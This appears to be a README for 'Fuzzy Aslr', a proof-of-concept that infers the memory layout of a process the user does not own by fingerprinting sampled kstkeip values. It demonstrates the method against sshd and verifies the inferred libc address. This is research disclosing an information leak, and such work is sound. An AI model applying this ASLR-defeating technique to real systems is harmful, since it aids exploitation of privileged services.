# Introduction #

kstkeip is a very low granularity counter, few processes worth attacking are compute bound for long periods of time. With the very few unique samples that can be acquired, it's not immediately obvious whether this information leak is useful or not (note that due to the way linkers typically use PT\_LOAD, data will be mapped immediately adjacent to text).

Fuzzy Aslr is a Proof of Concept implementation that attempts to "reconstruct" the address space layout of a process you don't own via kstkeip.

Thanks to x86 being a variable width instruction architecture, by recursively disassembling the target binary and all DT\_NEEDED dependencies and recording the instruction boundaries it encounters, we're able to build up a fingerprint of each section of code that will be mapped.

Surprisingly, just a few (6 or so) samples of kstskeip from the same mapping is enough to uniquely fingerprint most code.

# Details #

I am unable to see the address space layout of sshd

```

$ pidof sshd
3526
$ cat /proc/3526/maps
$
```

Now let's try and reconstruct it:

```
$ ./aslr 3526 /usr/sbin/sshd 
bounds.c:206,b_add_boundary_record():info: Found 71259 instruction boundaries from PT_LOAD@0 in /usr/sbin/sshd
bounds.c:206,b_add_boundary_record():info: Found 4724 instruction boundaries from PT_LOAD@0x84e000 in /lib/libwrap.so.0
bounds.c:206,b_add_boundary_record():info: Found 16381 instruction boundaries from PT_LOAD@0xdbe000 in /lib/libnsl.so.1
bounds.c:206,b_add_boundary_record():info: Found 288182 instruction boundaries from PT_LOAD@0x708000 in /lib/libc.so.6
bounds.c:206,b_add_boundary_record():info: Found 24301 instruction boundaries from PT_LOAD@0x6e6000 in /lib/ld-linux.so.2
bounds.c:206,b_add_boundary_record():info: Found 7005 instruction boundaries from PT_LOAD@0x682000 in /lib/libpam.so.0
bounds.c:206,b_add_boundary_record():info: Found 1387 instruction boundaries from PT_LOAD@0x877000 in /lib/libdl.so.2
bounds.c:206,b_add_boundary_record():info: Found 7284 instruction boundaries from PT_LOAD@0x666000 in /lib/libaudit.so.0
bounds.c:206,b_add_boundary_record():info: Found 15338 instruction boundaries from PT_LOAD@0xda4000 in /lib/libselinux.so.1
bounds.c:206,b_add_boundary_record():info: Found 53562 instruction boundaries from PT_LOAD@0x49b000 in /lib/libsepol.so.1
bounds.c:206,b_add_boundary_record():info: Found 12704 instruction boundaries from PT_LOAD@0xddd000 in /lib/libresolv.so.2
bounds.c:200,b_add_boundary_record():warn: oops, desync@0x53a21f in /lib/libcrypto.so.6, skipping...
bounds.c:206,b_add_boundary_record():info: Found 43022 instruction boundaries from PT_LOAD@0x4e3000 in /lib/libcrypto.so.6
bounds.c:206,b_add_boundary_record():info: Found 12639 instruction boundaries from PT_LOAD@0x896000 in /usr/lib/libz.so.1
bounds.c:206,b_add_boundary_record():info: Found 811 instruction boundaries from PT_LOAD@0x5896000 in /lib/libutil.so.1
bounds.c:206,b_add_boundary_record():info: Found 7439 instruction boundaries from PT_LOAD@0x6160000 in /lib/libcrypt.so.1
bounds.c:206,b_add_boundary_record():info: Found 36737 instruction boundaries from PT_LOAD@0x6a3000 in /usr/lib/libgssapi_krb5.so.2
bounds.c:206,b_add_boundary_record():info: Found 126052 instruction boundaries from PT_LOAD@0x4023000 in /usr/lib/libkrb5.so.3
bounds.c:206,b_add_boundary_record():info: Found 26639 instruction boundaries from PT_LOAD@0xbca000 in /usr/lib/libk5crypto.so.3
bounds.c:206,b_add_boundary_record():info: Found 4844 instruction boundaries from PT_LOAD@0x6d3000 in /usr/lib/libkrb5support.so.0
bounds.c:206,b_add_boundary_record():info: Found 646 instruction boundaries from PT_LOAD@0xdf7000 in /lib/libkeyutils.so.1
bounds.c:206,b_add_boundary_record():info: Found 775 instruction boundaries from PT_LOAD@0xdf2000 in /lib/libcom_err.so.2
bounds.c:206,b_add_boundary_record():info: Found 268653 instruction boundaries from PT_LOAD@0x66a8000 in /usr/lib/libnss3.so
bounds.c:206,b_add_boundary_record():info: Found 14133 instruction boundaries from PT_LOAD@0x6830000 in /usr/lib/libnssutil3.so
bounds.c:206,b_add_boundary_record():info: Found 2464 instruction boundaries from PT_LOAD@0x67ef000 in /usr/lib/libplc4.so
bounds.c:206,b_add_boundary_record():info: Found 41917 instruction boundaries from PT_LOAD@0x67f5000 in /usr/lib/libnspr4.so
bounds.c:206,b_add_boundary_record():info: Found 14465 instruction boundaries from PT_LOAD@0x87d000 in /lib/libpthread.so.0
bounds.c:206,b_add_boundary_record():info: Found 1512 instruction boundaries from PT_LOAD@0x67ea000 in /usr/lib/libplds4.so
sample.c:040,s_record():info: new unique sample 0x358410
```

New values are constantly being sampled, but as sshd is blocking in select() or similar, no new eip values are being seen. Lets make it do some work for a few minutes...

```
$ while :; do ssh localhost true; done
```

And the output from aslr:

```
sample.c:040,s_record():info: new unique sample 0x358410
sample.c:040,s_record():info: new unique sample 0xc1a379
sample.c:040,s_record():info: new unique sample 0xc464f6
sample.c:040,s_record():info: new unique sample 0x358428
sample.c:040,s_record():info: new unique sample 0x21f263
sample.c:040,s_record():info: new unique sample 0x7ce5ae
sample.c:040,s_record():info: new unique sample 0xc1e41c
bounds.c:096,b_fuzzy_match():info: /lib/libc.so.6 could be mapped at 0xbb5000, 4 matches, MEDIUM confidence (8 samples)
bounds.c:096,b_fuzzy_match():info: /usr/lib/libk5crypto.so.3 could be mapped at 0xc03000, 4 matches, MEDIUM confidence (11 samples)
sample.c:040,s_record():info: new unique sample 0xc1ed25
sample.c:040,s_record():info: new unique sample 0xc1b96d
bounds.c:087,b_fuzzy_match():info: /lib/libc.so.6 could be mapped at 0xbb5000, 8 matches, HIGH confidence (13 samples)
GUESS: 00bb5000-00cf3000 r-xp fd:00 0 /lib/libc.so.6
sample.c:040,s_record():info: new unique sample 0x791490
...
```

Just 13 unique samples from kstkeip were enough to guess where libc.so was mapped, and checking if it's correct:

```
$ sudo grep -A1 00bb5000-00cf3000 /proc/3526/maps
00bb5000-00cf3000 r-xp 00000000 fd:00 30507077   /lib/libc-2.5.so
00cf3000-00cf5000 r--p 0013e000 fd:00 30507077   /lib/libc-2.5.so
```

Exactly right! aslr will continue until it's been able to reconstruct the entire layout.